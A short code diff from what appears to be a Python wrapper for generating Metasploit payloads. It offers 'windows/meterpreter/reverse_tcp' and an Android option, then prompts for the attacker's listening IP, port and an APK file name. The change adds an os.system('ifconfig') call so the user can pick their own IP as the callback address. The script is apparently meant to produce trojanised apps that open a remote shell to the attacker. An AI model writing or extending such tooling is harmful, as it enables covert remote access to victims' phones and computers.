@@ -5,6 +5,8 @@ second = "windows/meterpreter/reverse_tcp"
 print("available payloads:", first)
 print("available payloads:", second)
 Android_payload = input("Enter the payload - first or second: ",)
+os.system("ifconfig")
+print("select your inet-'ip address'.")
 lhost = input("Enter your ip address - ",)
 lport = input("Enter your port number - ",)
 apk_name = input("Enter apk name - ",)
